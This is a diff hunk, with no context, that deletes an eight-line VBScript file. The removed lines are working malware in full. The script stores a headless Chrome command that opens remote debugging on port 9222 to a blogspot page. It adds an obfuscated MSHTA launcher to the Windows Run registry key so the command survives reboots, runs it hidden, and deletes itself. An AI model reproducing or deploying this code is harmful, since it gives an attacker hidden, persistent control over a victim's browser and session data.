@@ -1,8 +1,0 @@
-set Obj0 = CreateObject("Wscript.Shell")
-H="chrome.exe --headless --mute-audio --remote-debugging-port=9222 https://macaco-bebo.blogspot.com/"
-D="HKCU\v1Elm0D"
-Obj0.regwrite D,H,"REG_EXPAND_SZ"
-RR="MSHTA VbScript:Execute(" & chrw(34) & "CreateObject(" & chrw(34) & chrw(34) & "Wscript.Shell" & chrw(34) & chrw(34) & ").Run CreateObject(" & chrw(34) & chrw(34) & "Wscript.Shell" & chrw(34) & chrw(34) & ").RegRead(" & chrw(34) & chrw(34) & D & chrw(34) & chrw(34) & "), 0, False:close" & chrw(34) & ")"
-Obj0.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Warn", RR, "REG_EXPAND_SZ"
-Obj0.Run RR,0,false
-Obj0.Run  "cmd.exe /c del " & ChrW(34) & Wscript.scriptfullname & ChrW(34),0,false
